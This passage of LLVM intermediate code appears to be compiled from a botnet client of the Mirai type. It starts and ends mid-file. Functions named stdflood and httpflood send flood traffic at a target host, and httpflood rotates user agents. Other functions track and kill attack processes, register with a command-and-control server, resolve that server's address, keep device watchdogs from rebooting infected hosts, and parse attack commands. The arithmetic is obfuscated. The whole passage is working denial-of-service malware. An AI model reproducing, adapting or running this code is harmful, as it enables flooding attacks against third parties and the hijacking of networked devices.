  call void @llvm.stackrestore(i8* %495)
  br label %496

; <label>:496:                                    ; preds = %494, %55, %49, %42
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

declare i32 @printf(i8*, ...) #5

; Function Attrs: noinline nounwind uwtable
define void @stdflood(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %15, i32* %9, align 4
  %16 = call i64 @time(i64* null) #6
  store i64 %16, i64* %10, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %12, align 8
  %19 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %12, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %12, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #6
  %31 = load %struct.hostent*, %struct.hostent** %12, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %6, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %13, align 4
  br label %39

; <label>:39:                                     ; preds = %64, %4
  %40 = load i32, i32* %13, align 4
  %41 = icmp uge i32 %40, 50
  br i1 %41, label %42, label %64

; <label>:42:                                     ; preds = %39
  %43 = call i8* @makestring()
  store i8* %43, i8** %14, align 8
  %44 = load i32, i32* %9, align 4
  %45 = load i8*, i8** %14, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @send(i32 %44, i8* %45, i64 %47, i32 0)
  %49 = load i32, i32* %9, align 4
  %50 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %51 = call i32 @connect(i32 %49, %struct.sockaddr* %50, i32 16)
  %52 = call i64 @time(i64* null) #6
  %53 = load i64, i64* %10, align 8
  %54 = load i32, i32* %7, align 4
  %55 = sext i32 %54 to i64
  %56 = sub i64 0, %55
  %57 = sub i64 %53, %56
  %58 = add nsw i64 %53, %55
  %59 = icmp sge i64 %52, %57
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %42
  %61 = load i32, i32* %9, align 4
  %62 = call i32 @close(i32 %61)
  call void @_exit(i32 0) #11
  unreachable

; <label>:63:                                     ; preds = %42
  store i32 0, i32* %13, align 4
  br label %64

; <label>:64:                                     ; preds = %63, %39
  %65 = load i32, i32* %13, align 4
  %66 = sub i32 0, 1
  %67 = sub i32 %65, %66
  %68 = add i32 %65, 1
  store i32 %67, i32* %13, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #5

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #2

declare i64 @send(i32, i8*, i64, i32) #5

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i32 @close(i32) #5

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i32 0, i32 0)) #6
  call void @exit(i32 1) #12
  unreachable

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* %18, i8* %20, i64 %24) #6
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 zeroext %25) #9
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 2, i32 1, i32 6) #6
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 %30, i32 6, i32 1, i8* %31, i32 4) #6
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i32 0, i32 0))
  call void @exit(i32 1) #12
  unreachable

; <label>:36:                                     ; preds = %13
  %37 = load i32, i32* %8, align 4
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %39 = call i32 @connect(i32 %37, %struct.sockaddr* %38, i32 16)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0))
  call void @exit(i32 1) #12
  unreachable

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %8, align 4
  ret i32 %43
}

; Function Attrs: nounwind
declare void @herror(i8*) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

declare void @perror(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @httpflood(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #6
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = sub i64 0, %19
  %23 = sub i64 0, %21
  %24 = add i64 %22, %23
  %25 = sub i64 0, %24
  %26 = add nsw i64 %19, %21
  %27 = trunc i64 %25 to i32
  store i32 %27, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %28

; <label>:28:                                     ; preds = %67, %6
  %29 = load i32, i32* %14, align 4
  %30 = load i32, i32* %12, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %73

; <label>:32:                                     ; preds = %28
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %34 = load i8*, i8** %7, align 8
  %35 = load i8*, i8** %10, align 8
  %36 = load i8*, i8** %8, align 8
  %37 = call i32 @rand() #6
  %38 = srem i32 %37, 39
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [39 x i8*], [39 x i8*]* @UserAgents, i64 0, i64 %39
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %33, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.53, i32 0, i32 0), i8* %34, i8* %35, i8* %36, i8* %41) #6
  br label %43

; <label>:43:                                     ; preds = %65, %32
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = call i64 @time(i64* null) #6
  %47 = icmp sgt i64 %45, %46
  br i1 %47, label %48, label %66

; <label>:48:                                     ; preds = %43
  %49 = load i8*, i8** %8, align 8
  %50 = load i16, i16* %9, align 2
  %51 = call i32 @socket_connect(i8* %49, i16 zeroext %50)
  store i32 %51, i32* %13, align 4
  %52 = load i32, i32* %13, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %54, label %65

; <label>:54:                                     ; preds = %48
  %55 = load i32, i32* %13, align 4
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %58 = call i64 @strlen(i8* %57) #10
  %59 = call i64 @write(i32 %55, i8* %56, i64 %58)
  %60 = load i32, i32* %13, align 4
  %61 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %62 = call i64 @read(i32 %60, i8* %61, i64 1)
  %63 = load i32, i32* %13, align 4
  %64 = call i32 @close(i32 %63)
  br label %65

; <label>:65:                                     ; preds = %54, %48
  br label %43

; <label>:66:                                     ; preds = %43
  call void @exit(i32 0) #12
  unreachable
                                                  ; No predecessors!
  %68 = load i32, i32* %14, align 4
  %69 = sub i32 %68, -476513875
  %70 = add i32 %69, 1
  %71 = add i32 %70, -476513875
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %14, align 4
  br label %28

; <label>:73:                                     ; preds = %28
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

declare i64 @write(i32, i8*, i64) #5

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %62

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numattackpids, align 8
  %12 = sub i64 0, %11
  %13 = sub i64 0, 1
  %14 = add i64 %12, %13
  %15 = sub i64 0, %14
  %16 = add i64 %11, 1
  store i64 %15, i64* @numattackpids, align 8
  %17 = load i64, i64* @numattackpids, align 8
  %18 = sub i64 0, 1
  %19 = sub i64 %17, %18
  %20 = add i64 %17, 1
  %21 = mul i64 %19, 4
  %22 = call noalias i8* @malloc(i64 %21) #6
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %43, %10
  %25 = load i32, i32* %4, align 4
  %26 = zext i32 %25 to i64
  %27 = load i64, i64* @numattackpids, align 8
  %28 = add i64 %27, -4500970984345670316
  %29 = sub i64 %28, 1
  %30 = sub i64 %29, -4500970984345670316
  %31 = sub i64 %27, 1
  %32 = icmp ult i64 %26, %30
  br i1 %32, label %33, label %49

; <label>:33:                                     ; preds = %24
  %34 = load i32*, i32** @attackpids, align 8
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %34, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  br label %43

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %4, align 4
  %45 = add i32 %44, 1205592116
  %46 = add i32 %45, 1
  %47 = sub i32 %46, 1205592116
  %48 = add i32 %44, 1
  store i32 %47, i32* %4, align 4
  br label %24

; <label>:49:                                     ; preds = %24
  %50 = load i32, i32* %2, align 4
  %51 = load i32*, i32** %3, align 8
  %52 = load i64, i64* @numattackpids, align 8
  %53 = add i64 %52, 5207620492537757262
  %54 = sub i64 %53, 1
  %55 = sub i64 %54, 5207620492537757262
  %56 = sub i64 %52, 1
  %57 = getelementptr inbounds i32, i32* %51, i64 %55
  store i32 %50, i32* %57, align 4
  %58 = load i32*, i32** @attackpids, align 8
  %59 = bitcast i32* %58 to i8*
  call void @free(i8* %59) #6
  %60 = load i32*, i32** %3, align 8
  store i32* %60, i32** @attackpids, align 8
  %61 = load i32, i32* %2, align 4
  store i32 %61, i32* %1, align 4
  br label %62

; <label>:62:                                     ; preds = %49, %8
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind uwtable
define void @stop_attack() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i64 0, i64* %2, align 8
  br label %3

; <label>:3:                                      ; preds = %33, %0
  %4 = load i64, i64* %2, align 8
  %5 = load i64, i64* @numattackpids, align 8
  %6 = icmp ult i64 %4, %5
  br i1 %6, label %7, label %40

; <label>:7:                                      ; preds = %3
  %8 = load i32*, i32** @attackpids, align 8
  %9 = load i64, i64* %2, align 8
  %10 = getelementptr inbounds i32, i32* %8, i64 %9
  %11 = load i32, i32* %10, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %13, label %32

; <label>:13:                                     ; preds = %7
  %14 = load i32*, i32** @attackpids, align 8
  %15 = load i64, i64* %2, align 8
  %16 = getelementptr inbounds i32, i32* %14, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @getpid() #6
  %19 = icmp ne i32 %17, %18
  br i1 %19, label %20, label %32

; <label>:20:                                     ; preds = %13
  %21 = load i32*, i32** @attackpids, align 8
  %22 = load i64, i64* %2, align 8
  %23 = getelementptr inbounds i32, i32* %21, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = call i32 @kill(i32 %24, i32 9) #6
  %26 = load i32, i32* %1, align 4
  %27 = sub i32 0, %26
  %28 = sub i32 0, 1
  %29 = add i32 %27, %28
  %30 = sub i32 0, %29
  %31 = add nsw i32 %26, 1
  store i32 %30, i32* %1, align 4
  br label %32

; <label>:32:                                     ; preds = %20, %13, %7
  br label %33

; <label>:33:                                     ; preds = %32
  %34 = load i64, i64* %2, align 8
  %35 = sub i64 0, %34
  %36 = sub i64 0, 1
  %37 = add i64 %35, %36
  %38 = sub i64 0, %37
  %39 = add i64 %34, 1
  store i64 %38, i64* %2, align 8
  br label %3

; <label>:40:                                     ; preds = %3
  ret void
}

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @registerme(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [100 x i8], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %5 = load i8*, i8** %2, align 8
  %6 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %4, i64 100, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i32 0, i32 0), i8* %5) #6
  %7 = load i32, i32* @C2, align 4
  %8 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %9 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %10 = call i64 @strlen(i8* %9) #10
  %11 = call i64 @write(i32 %7, i8* %8, i64 %10)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %1
  br label %15

; <label>:14:                                     ; preds = %1
  br label %15

; <label>:15:                                     ; preds = %14, %13
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @resolve_http() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.hostent*, align 8
  %3 = alloca %struct.in_addr**, align 8
  %4 = alloca i32, align 4
  %5 = load i8*, i8** @c2_http_host, align 8
  %6 = call %struct.hostent* @gethostbyname(i8* %5)
  store %struct.hostent* %6, %struct.hostent** %2, align 8
  %7 = icmp eq %struct.hostent* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %0
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i32 0, i32 0)) #6
  store i32 1, i32* %1, align 4
  br label %37

; <label>:9:                                      ; preds = %0
  %10 = load %struct.hostent*, %struct.hostent** %2, align 8
  %11 = getelementptr inbounds %struct.hostent, %struct.hostent* %10, i32 0, i32 4
  %12 = load i8**, i8*** %11, align 8
  %13 = bitcast i8** %12 to %struct.in_addr**
  store %struct.in_addr** %13, %struct.in_addr*** %3, align 8
  store i32 0, i32* %4, align 4
  br label %14

; <label>:14:                                     ; preds = %31, %9
  %15 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %15, i64 %17
  %19 = load %struct.in_addr*, %struct.in_addr** %18, align 8
  %20 = icmp ne %struct.in_addr* %19, null
  br i1 %20, label %21, label %36

; <label>:21:                                     ; preds = %14
  %22 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %22, i64 %24
  %26 = load %struct.in_addr*, %struct.in_addr** %25, align 8
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  %28 = load i32, i32* %27, align 4
  %29 = call i8* @inet_ntoa(i32 %28) #6
  %30 = call i8* @strcpy(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0), i8* %29) #6
  store i32 0, i32* %1, align 4
  br label %37
                                                  ; No predecessors!
  %32 = load i32, i32* %4, align 4
  %33 = sub i32 0, 1
  %34 = sub i32 %32, %33
  %35 = add nsw i32 %32, 1
  store i32 %34, i32* %4, align 4
  br label %14

; <label>:36:                                     ; preds = %14
  store i32 1, i32* %1, align 4
  br label %37

; <label>:37:                                     ; preds = %36, %21, %8
  %38 = load i32, i32* %1, align 4
  ret i32 %38
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @watchdog_maintain() #0 {
  %1 = alloca [7 x i32], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = bitcast [7 x i32]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 28, i32 16, i1 false)
  store i32 1, i32* %2, align 4
  store i32 0, i32* %3, align 4
  call void @table_unlock_val(i8 zeroext 1)
  call void @table_unlock_val(i8 zeroext 2)
  call void @table_unlock_val(i8 zeroext 3)
  call void @table_unlock_val(i8 zeroext 4)
  call void @table_unlock_val(i8 zeroext 5)
  call void @table_unlock_val(i8 zeroext 6)
  call void @table_unlock_val(i8 zeroext 7)
  %5 = call i8* @table_retrieve_val(i32 1, i32* null)
  %6 = call i32 (i8*, i32, ...) @open(i8* %5, i32 2)
  %7 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  store i32 %6, i32* %7, align 16
  %8 = icmp ne i32 %6, -1
  br i1 %8, label %39, label %9

; <label>:9:                                      ; preds = %0
  %10 = call i8* @table_retrieve_val(i32 2, i32* null)
  %11 = call i32 (i8*, i32, ...) @open(i8* %10, i32 2)
  %12 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  store i32 %11, i32* %12, align 4
  %13 = icmp ne i32 %11, -1
  br i1 %13, label %39, label %14

; <label>:14:                                     ; preds = %9
  %15 = call i8* @table_retrieve_val(i32 3, i32* null)
  %16 = call i32 (i8*, i32, ...) @open(i8* %15, i32 2)
  %17 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  store i32 %16, i32* %17, align 8
  %18 = icmp ne i32 %16, -1
  br i1 %18, label %39, label %19

; <label>:19:                                     ; preds = %14
  %20 = call i8* @table_retrieve_val(i32 4, i32* null)
  %21 = call i32 (i8*, i32, ...) @open(i8* %20, i32 2)
  %22 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  store i32 %21, i32* %22, align 4
  %23 = icmp ne i32 %21, -1
  br i1 %23, label %39, label %24

; <label>:24:                                     ; preds = %19
  %25 = call i8* @table_retrieve_val(i32 5, i32* null)
  %26 = call i32 (i8*, i32, ...) @open(i8* %25, i32 2)
  %27 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  store i32 %26, i32* %27, align 16
  %28 = icmp ne i32 %26, -1
  br i1 %28, label %39, label %29

; <label>:29:                                     ; preds = %24
  %30 = call i8* @table_retrieve_val(i32 6, i32* null)
  %31 = call i32 (i8*, i32, ...) @open(i8* %30, i32 2)
  %32 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  store i32 %31, i32* %32, align 4
  %33 = icmp ne i32 %31, -1
  br i1 %33, label %39, label %34

; <label>:34:                                     ; preds = %29
  %35 = call i8* @table_retrieve_val(i32 7, i32* null)
  %36 = call i32 (i8*, i32, ...) @open(i8* %35, i32 2)
  %37 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  store i32 %36, i32* %37, align 8
  %38 = icmp ne i32 %36, -1
  br i1 %38, label %39, label %61

; <label>:39:                                     ; preds = %34, %29, %24, %19, %14, %9, %0
  store i32 1, i32* %3, align 4
  %40 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %41 = load i32, i32* %40, align 16
  %42 = call i32 (i32, i64, ...) @ioctl(i32 %41, i64 2147768068, i32* %2) #6
  %43 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %44 = load i32, i32* %43, align 4
  %45 = call i32 (i32, i64, ...) @ioctl(i32 %44, i64 2147768068, i32* %2) #6
  %46 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %47 = load i32, i32* %46, align 8
  %48 = call i32 (i32, i64, ...) @ioctl(i32 %47, i64 2147768068, i32* %2) #6
  %49 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %50 = load i32, i32* %49, align 4
  %51 = call i32 (i32, i64, ...) @ioctl(i32 %50, i64 2147768068, i32* %2) #6
  %52 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %53 = load i32, i32* %52, align 16
  %54 = call i32 (i32, i64, ...) @ioctl(i32 %53, i64 2147768068, i32* %2) #6
  %55 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %56 = load i32, i32* %55, align 4
  %57 = call i32 (i32, i64, ...) @ioctl(i32 %56, i64 2147768068, i32* %2) #6
  %58 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %59 = load i32, i32* %58, align 8
  %60 = call i32 (i32, i64, ...) @ioctl(i32 %59, i64 2147768068, i32* %2) #6
  br label %61

; <label>:61:                                     ; preds = %39, %34
  %62 = load i32, i32* %3, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %88

; <label>:64:                                     ; preds = %61
  br label %65

; <label>:65:                                     ; preds = %65, %64
  %66 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %67 = load i32, i32* %66, align 16
  %68 = call i32 (i32, i64, ...) @ioctl(i32 %67, i64 2147768069, i32 0) #6
  %69 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = call i32 (i32, i64, ...) @ioctl(i32 %70, i64 2147768069, i32 0) #6
  %72 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %73 = load i32, i32* %72, align 8
  %74 = call i32 (i32, i64, ...) @ioctl(i32 %73, i64 2147768069, i32 0) #6
  %75 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %76 = load i32, i32* %75, align 4
  %77 = call i32 (i32, i64, ...) @ioctl(i32 %76, i64 2147768069, i32 0) #6
  %78 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %79 = load i32, i32* %78, align 16
  %80 = call i32 (i32, i64, ...) @ioctl(i32 %79, i64 2147768069, i32 0) #6
  %81 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %82 = load i32, i32* %81, align 4
  %83 = call i32 (i32, i64, ...) @ioctl(i32 %82, i64 2147768069, i32 0) #6
  %84 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %85 = load i32, i32* %84, align 8
  %86 = call i32 (i32, i64, ...) @ioctl(i32 %85, i64 2147768069, i32 0) #6
  %87 = call i32 @sleep(i32 3)
  br label %65

; <label>:88:                                     ; preds = %61
  call void @table_lock_val(i8 zeroext 1)
  call void @table_lock_val(i8 zeroext 2)
  call void @table_lock_val(i8 zeroext 3)
  call void @table_lock_val(i8 zeroext 4)
  call void @table_lock_val(i8 zeroext 5)
  call void @table_lock_val(i8 zeroext 6)
  call void @table_lock_val(i8 zeroext 7)
  ret void
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

declare i32 @sleep(i32) #5

; Function Attrs: noinline nounwind uwtable
define void @proc_cmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %5 = load i8**, i8*** %4, align 8
  %6 = getelementptr inbounds i8*, i8** %5, i64 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i8* @strstr(i8* %7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i32 0, i32 0)) #10
  %9 = icmp ne i8* %8, null
  br i1 %9, label %28, label %10

; <label>:10:                                     ; preds = %2
  %11 = load i8**, i8*** %4, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 0
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %15 = icmp ne i8* %14, null
  br i1 %15, label %28, label %16

; <label>:16:                                     ; preds = %10
  %17 = load i8**, i8*** %4, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i8* @strstr(i8* %19, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i32 0, i32 0)) #10
  %21 = icmp ne i8* %20, null
  br i1 %21, label %28, label %22

; <label>:22:                                     ; preds = %16
  %23 = load i8**, i8*** %4, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i8* @strstr(i8* %25, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0)) #10
  %27 = icmp ne i8* %26, null
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %22, %16, %10, %2
  call void @stop_attack()
  br label %29

; <label>:29:                                     ; preds = %28, %22
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @strstr(i8* %32, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.60, i32 0, i32 0)) #10
  %34 = icmp ne i8* %33, null
  br i1 %34, label %41, label %35

; <label>:35:                                     ; preds = %29
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i8* @strstr(i8* %38, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i32 0, i32 0)) #10
  %40 = icmp ne i8* %39, null
  br i1 %40, label %41, label %68

